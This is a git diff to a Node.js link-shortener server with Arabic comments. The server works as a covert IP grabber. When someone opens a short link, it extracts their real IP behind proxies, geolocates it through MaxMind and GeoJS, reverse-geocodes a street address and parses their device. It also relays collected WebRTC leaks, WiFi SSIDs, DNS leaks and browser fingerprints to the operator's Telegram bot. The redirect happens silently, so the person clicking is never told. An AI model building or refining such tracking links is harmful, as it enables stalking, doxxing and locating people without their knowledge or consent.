@@ -2,6 +2,10 @@ const express = require('express');
 const axios = require('axios');
 const crypto = require('crypto');
 const cors = require('cors');
+const path = require('path');
+const net = require('net');
+const maxmind = require('maxmind');
+const { UAParser } = require('ua-parser-js');
 require('dotenv').config();
 
 const app = express();
@@ -16,10 +20,73 @@ const BASE_URL = process.env.SHORT_DOMAIN || 'https://vvvvv-production-7945.up.r
 
 const linkStorage = {};
 
+// ===== قاعدة بيانات MaxMind المحلية (الأدق، تعمل بدون إنترنت) =====
+let geoDb = null;
+maxmind
+  .open(path.join(__dirname, 'geoip', 'GeoLite2-City.mmdb'))
+  .then((db) => {
+    geoDb = db;
+    console.log('✅ [GeoIP] MaxMind database loaded');
+  })
+  .catch((err) => {
+    console.error('❌ [GeoIP] Failed to load MaxMind database:', err.message);
+  });
+
 function generateShortCode() {
   return crypto.randomBytes(4).toString('hex');
 }
 
+// ===== أدوات IP =====
+function normalizeIP(ip) {
+  if (!ip) return 'Unknown';
+  if (ip.startsWith('::ffff:')) return ip.slice(7);
+  return ip.trim();
+}
+
+function isPublicIP(ip) {
+  const clean = normalizeIP(ip);
+  if (net.isIPv4(clean)) {
+    const p = clean.split('.').map(Number);
+    if (p[0] === 10) return false;
+    if (p[0] === 172 && p[1] >= 16 && p[1] <= 31) return false;
+    if (p[0] === 192 && p[1] === 168) return false;
+    if (p[0] === 127) return false;
+    if (p[0] === 169 && p[1] === 254) return false;
+    if (p[0] === 100 && p[1] >= 64 && p[1] <= 127) return false; // CGNAT
+    return true;
+  }
+  if (net.isIPv6(clean)) {
+    const lower = clean.toLowerCase();
+    if (lower === '::1') return false;
+    if (lower.startsWith('fc') || lower.startsWith('fd')) return false;
+    if (lower.startsWith('fe80')) return false;
+    return true;
+  }
+  return false;
+}
+
+// استخراج IP العميل الحقيقي حتى خلف بروكسي Railway
+function getClientIP(req) {
+  const forwarded = req.headers['x-forwarded-for'];
+  if (forwarded) {
+    const ips = forwarded
+      .split(',')
+      .map((s) => normalizeIP(s))
+      .filter(Boolean);
+    // أول IP عام في السلسلة هو العميل الحقيقي
+    const clientIp = ips.find((ip) => isPublicIP(ip));
+    if (clientIp) return clientIp;
+    if (ips.length) return ips[0];
+  }
+
+  const realIp = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'];
+  if (realIp) return normalizeIP(realIp);
+
+  const remote = req.socket?.remoteAddress || req.connection?.remoteAddress || 'Unknown';
+  return normalizeIP(remote);
+}
+
+// ===== إرسال إلى تلجرام =====
 async function sendToTelegram(msg, retries = 3) {
   for (let i = 0; i < retries; i++) {
     try {
@@ -37,91 +104,101 @@ async function sendToTelegram(msg, retries = 3) {
       return true;
     } catch (err) {
       console.error(`❌ [TG] Attempt ${i + 1} failed`);
-      if (i < retries - 1) await new Promise(r => setTimeout(r, 500));
+      if (i < retries - 1) await new Promise((r) => setTimeout(r, 500));
     }
   }
   return false;
 }
 
-async function getLocationFromFreeGeoIP(ip) {
-  try {
-    const res = await axios.get(`https://freegeoip.app/json/${ip}`, { timeout: 3000 });
-    if (res.data) {
-      return {
-        latitude: res.data.latitude,
-        longitude: res.data.longitude,
-        country: res.data.country_name || 'Unknown',
-        city: res.data.city || 'Unknown'
-      };
-    }
-  } catch (e) {}
-  return null;
-}
-
-async function getLocationFromIPInfo(ip) {
-  try {
-    const res = await axios.get(`https://ipinfo.io/${ip}?token=9f5b1ad4e5e8e0`, { timeout: 3000 });
-    if (res.data && res.data.loc) {
-      const [lat, lng] = res.data.loc.split(',');
-      return {
-        latitude: parseFloat(lat),
-        longitude: parseFloat(lng),
-        country: res.data.country || 'Unknown',
-        city: res.data.city || 'Unknown'
-      };
-    }
-  } catch (e) {}
-  return null;
-}
-
+// ===== تحديد الموقع =====
+// خدمة احتياطية عبر الإنترنت (تُستخدم فقط إذا لم تتوفر قاعدة MaxMind)
 async function getLocationFromGeoJS(ip) {
   try {
-    const res = await axios.get(`https://get.geojs.io/v1/ip/geo/${ip}.json`, { timeout: 3000 });
-    if (res.data) {
+    const res = await axios.get(`https://get.geojs.io/v1/ip/geo/${ip}.json`, { timeout: 4000 });
+    if (res.data && res.data.latitude) {
       return {
-        latitude: res.data.latitude,
-        longitude: res.data.longitude,
-        country: res.data.country_name || 'Unknown',
-        city: res.data.city || 'Unknown'
+        latitude: parseFloat(res.data.latitude),
+        longitude: parseFloat(res.data.longitude),
+        accuracy_radius: null,
+        country: res.data.country || 'Unknown',
+        country_code: res.data.country_code || '',
+        city: res.data.city || 'Unknown',
+        region: res.data.region || '',
+        timezone: res.data.timezone || '',
+        source: 'GeoJS'
       };
     }
-  } catch (e) {}
+  } catch (e) {
+    console.error('❌ [GeoJS] lookup failed:', e.message);
+  }
   return null;
 }
 
-async function getAveragedLocation(ip) {
-  const results = await Promise.all([
-    getLocationFromFreeGeoIP(ip),
-    getLocationFromIPInfo(ip),
-    getLocationFromGeoJS(ip)
-  ]);
+async function getLocation(ip) {
+  const cleanIp = normalizeIP(ip);
 
-  const validResults = results.filter(r => r !== null);
-  if (validResults.length === 0) return null;
+  // 1) MaxMind المحلية — الأدق والأكثر استقراراً
+  if (geoDb && net.isIP(cleanIp)) {
+    try {
+      const r = geoDb.get(cleanIp);
+      if (r && r.location) {
+        const loc = {
+          latitude: r.location.latitude,
+          longitude: r.location.longitude,
+          accuracy_radius: r.location.accuracy_radius,
+          country: r.country?.names?.en || 'Unknown',
+          country_code: r.country?.iso_code || '',
+          city: r.city?.names?.en || 'Unknown',
+          region: r.subdivisions?.[0]?.names?.en || '',
+          timezone: r.location.time_zone || '',
+          source: 'MaxMind GeoLite2'
+        };
+        console.log(`🌍 [GEO] ${cleanIp} -> ${loc.city}, ${loc.country} (${loc.source})`);
+        return loc;
+      }
+    } catch (e) {
+      console.error('❌ [MaxMind] lookup failed:', e.message);
+    }
+  }
 
-  const avgLat = validResults.reduce((sum, r) => sum + r.latitude, 0) / validResults.length;
-  const avgLng = validResults.reduce((sum, r) => sum + r.longitude, 0) / validResults.length;
-
-  return {
-    latitude: avgLat.toFixed(6),
-    longitude: avgLng.toFixed(6),
-    country: validResults[0].country,
-    city: validResults[0].city
-  };
+  // 2) احتياطي عبر الإنترنت
+  const fallback = await getLocationFromGeoJS(cleanIp);
+  console.log(`🌍 [GEO] ${cleanIp} -> ${fallback ? `${fallback.city}, ${fallback.country} (${fallback.source})` : 'not found'}`);
+  return fallback;
 }
 
+// ===== الترميز العكسي للعنوان (Nominatim) =====
 async function reverseGeocode(lat, lng) {
   try {
     const res = await axios.get(
       `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
-      { timeout: 3000, headers: { 'User-Agent': 'LinkShortener/1.0' } }
+      { timeout: 4000, headers: { 'User-Agent': 'LinkShortener/1.0' } }
     );
-    if (res.data && res.data.address) {
-      const addr = res.data.address;
-      return addr.address || 'Unknown Location';
+    if (res.data && res.data.display_name) {
+      return res.data.display_name;
     }
-  } catch (e) {}
+  } catch (e) {
+    console.error('❌ [Nominatim] reverse geocode failed:', e.message);
+  }
   return null;
+}
+
+// ===== معلومات الجهاز من User-Agent =====
+function parseUserAgent(ua) {
+  try {
+    const parsed = new UAParser(ua).getResult();
+    const parts = [
+      parsed.browser?.name ? `${parsed.browser.name} ${parsed.browser.version || ''}`.trim() : null,
+      parsed.os?.name ? `${parsed.os.name} ${parsed.os.version || ''}`.trim() : null,
+      parsed.device?.type ? parsed.device.type : null,
+      parsed.device?.vendor ? parsed.device.vendor : null,
+      parsed.device?.model ? parsed.device.model : null,
+      parsed.cpu?.architecture ? `CPU: ${parsed.cpu.architecture}` : null
+    ].filter(Boolean);
+    return parts.join(' | ') || null;
+  } catch (e) {
+    return null;
+  }
 }
 
 function safeParseBody(req) {
@@ -129,6 +206,26 @@ function safeParseBody(req) {
     try { return JSON.parse(req.body); } catch (e) { return {}; }
   }
   return req.body || {};
+}
+
+function escapeHtml(str) {
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+}
+
+function formatLocationBlock(loc) {
+  let msg = '';
+  const lat = loc.latitude;
+  const lng = loc.longitude;
+  msg += `📍 <code>${lat}, ${lng}</code>\n`;
+  if (loc.accuracy_radius) msg += `🎯 دقة تقريبية: ~${loc.accuracy_radius} كم\n`;
+  msg += `🏙️ ${loc.city}${loc.region ? ', ' + loc.region : ''}, ${loc.country}\n`;
+  if (loc.timezone) msg += `⏱️ ${loc.timezone}\n`;
+  msg += `🗺️ <a href="https://maps.google.com/?q=${lat},${lng}">Google Maps</a>\n`;
+  msg += `🧭 المصدر: ${loc.source}\n`;
+  return msg;
 }
 
 app.post('/api/shorten', (req, res) => {
@@ -158,98 +255,107 @@ app.post('/api/log-all', async (req, res) => {
     return res.status(404).json({ error: 'Not found' });
   }
 
-  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
+  const ip = getClientIP(req);
+  const ua = req.headers['user-agent'] || '';
   const originalUrl = linkStorage[code].original;
   linkStorage[code].clicks++;
 
-  // Get best location for reverse geocoding
-  const bestLoc = await getAveragedLocation(ip);
+  // تحديد الموقع (MaxMind أولاً)
+  const loc = await getLocation(ip);
   let address = null;
-  if (bestLoc) {
-    address = await reverseGeocode(bestLoc.latitude, bestLoc.longitude);
+  if (loc) {
+    address = await reverseGeocode(loc.latitude, loc.longitude);
   }
 
   let msg = `🔗 <b>رابط فُتح!</b>\n━━━━━━━━━━━━━━━━━━━\n`;
-  msg += `<b>📌 الكود:</b> <code>${code}</code>\n`;
-  msg += `<b>🔌 IP:</b> <code>${ip}</code>\n`;
+  msg += `<b>📌 الكود:</b> <code>${escapeHtml(code)}</code>\n`;
+  msg += `<b>🎯 الهدف:</b> ${escapeHtml(originalUrl)}\n`;
+  msg += `<b>🔌 IP:</b> <code>${escapeHtml(ip)}</code>\n`;
   msg += `⏰ ${new Date().toLocaleString('ar-SA')}\n━━━━━━━━━━━━━━━━━━━\n\n`;
+
+  // الموقع الجغرافي الدقيق
+  if (loc) {
+    msg += `<b>✅ تحديد الموقع (${loc.source})</b>\n`;
+    msg += formatLocationBlock(loc);
+    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
+  } else {
+    msg += `<b>⚠️ لم يتم تحديد الموقع</b>\n━━━━━━━━━━━━━━━━━━━\n\n`;
+  }
+
+  // معلومات الجهاز من User-Agent
+  const uaInfo = parseUserAgent(ua);
+  if (uaInfo) {
+    msg += `<b>🖥️ الجهاز:</b>\n${escapeHtml(uaInfo)}\n`;
+    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
+  }
 
   // طريقة 1: WebRTC
   if (methods?.webrtc) {
     msg += `<b>✅ الطريقة 1: WebRTC (Private IP)</b>\n`;
-    msg += `🔌 ${methods.webrtc}\n`;
+    msg += `🔌 ${escapeHtml(methods.webrtc)}\n`;
     msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
   }
 
   // طريقة 2: WiFi SSID
   if (methods?.wifi) {
     msg += `<b>✅ الطريقة 2: WiFi SSID</b>\n`;
-    msg += `📡 ${methods.wifi}\n`;
-    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
-  }
-
-  // طريقة 3: Multi-API Averaging
-  if (bestLoc) {
-    msg += `<b>✅ الطريقة 3: Multi-API Averaging</b>\n`;
-    msg += `📍 <code>${bestLoc.latitude}, ${bestLoc.longitude}</code>\n`;
-    msg += `🏙️ ${bestLoc.city}, ${bestLoc.country}\n`;
-    msg += `🗺️ <a href="https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}">Maps</a>\n`;
+    msg += `📡 ${escapeHtml(methods.wifi)}\n`;
     msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
   }
 
   // طريقة 4: Browser Fingerprinting
   if (methods?.fingerprint) {
     msg += `<b>✅ الطريقة 4: Browser Fingerprinting</b>\n`;
-    msg += `🖥️ ${methods.fingerprint}\n`;
+    msg += `🖥️ ${escapeHtml(methods.fingerprint)}\n`;
     msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
   }
 
   // طريقة 5: DNS Leak
   if (methods?.dns) {
     msg += `<b>✅ الطريقة 5: DNS Leak</b>\n`;
-    msg += `🌐 ${methods.dns}\n`;
+    msg += `🌐 ${escapeHtml(methods.dns)}\n`;
     msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
   }
 
   // طريقة 6: HTTP Headers Analysis
   if (methods?.headers) {
     msg += `<b>✅ الطريقة 6: HTTP Headers</b>\n`;
-    msg += `📋 Language: ${methods.headers.language || 'Unknown'}\n`;
-    msg += `🌍 Encoding: ${methods.headers.encoding || 'Unknown'}\n`;
+    msg += `📋 Language: ${escapeHtml(methods.headers.language || 'Unknown')}\n`;
+    msg += `🌍 Encoding: ${escapeHtml(methods.headers.encoding || 'Unknown')}\n`;
     msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
   }
 
   // طريقة 7: Timezone
   if (methods?.timezone) {
     msg += `<b>✅ الطريقة 7: Timezone Detection</b>\n`;
-    msg += `⏱️ ${methods.timezone}\n`;
+    msg += `⏱️ ${escapeHtml(methods.timezone)}\n`;
     msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
   }
 
   // طريقة 8: WebGL Canvas
   if (methods?.webgl) {
     msg += `<b>✅ الطريقة 8: WebGL Canvas</b>\n`;
-    msg += `🎮 ${methods.webgl}\n`;
+    msg += `🎮 ${escapeHtml(methods.webgl)}\n`;
     msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
   }
 
   // طريقة 9: Screen Resolution
   if (methods?.screen) {
     msg += `<b>✅ الطريقة 9: Screen Resolution</b>\n`;
-    msg += `📺 ${methods.screen}\n`;
+    msg += `📺 ${escapeHtml(methods.screen)}\n`;
     msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
   }
 
   // طريقة 10: Browser Features
   if (methods?.features) {
     msg += `<b>✅ الطريقة 10: Browser Features</b>\n`;
-    msg += `🌟 ${methods.features}\n`;
+    msg += `🌟 ${escapeHtml(methods.features)}\n`;
     msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
   }
 
   // Address info
   if (address) {
-    msg += `<b>📍 العنوان:</b>\n${address}`;
+    msg += `<b>📍 العنوان التقريبي:</b>\n${escapeHtml(address)}`;
   }
 
   await sendToTelegram(msg);
@@ -263,6 +369,7 @@ app.get('/api/test', async (req, res) => {
 
 app.use(express.static('.'));
 
+// إعادة التوجيه المباشر للرابط الأصلي (بدون صفحة وسيطة)
 app.get('/:code', async (req, res) => {
   const { code } = req.params;
 
@@ -273,14 +380,28 @@ app.get('/:code', async (req, res) => {
   const originalUrl = linkStorage[code].original;
   linkStorage[code].clicks++;
 
-  setImmediate(async () => {
-    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
-    const bestLoc = await getAveragedLocation(ip);
+  const ip = getClientIP(req);
+  const ua = req.headers['user-agent'] || '';
 
-    let msg = `🔗 <b>رابط!</b> ${code}\n<code>${ip}</code>`;
-    if (bestLoc) {
-      msg += `\n📍 ${bestLoc.city}, ${bestLoc.country}\n🗺️ <a href="https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}">Map</a>`;
+  setImmediate(async () => {
+    const loc = await getLocation(ip);
+
+    let msg = `🔗 <b>رابط فُتح!</b>\n`;
+    msg += `<b>📌 الكود:</b> <code>${escapeHtml(code)}</code>\n`;
+    msg += `<b>🔌 IP:</b> <code>${escapeHtml(ip)}</code>\n`;
+    msg += `⏰ ${new Date().toLocaleString('ar-SA')}\n━━━━━━━━━━━━━━━━━━━\n`;
+
+    if (loc) {
+      msg += `<b>✅ تحديد الموقع (${loc.source})</b>\n`;
+      msg += formatLocationBlock(loc);
+      const addr = await reverseGeocode(loc.latitude, loc.longitude);
+      if (addr) msg += `📍 ${escapeHtml(addr)}\n`;
+    } else {
+      msg += `⚠️ لم يتم تحديد الموقع\n`;
     }
+
+    const uaInfo = parseUserAgent(ua);
+    if (uaInfo) msg += `\n🖥️ <b>الجهاز:</b> ${escapeHtml(uaInfo)}`;
 
     await sendToTelegram(msg);
   });
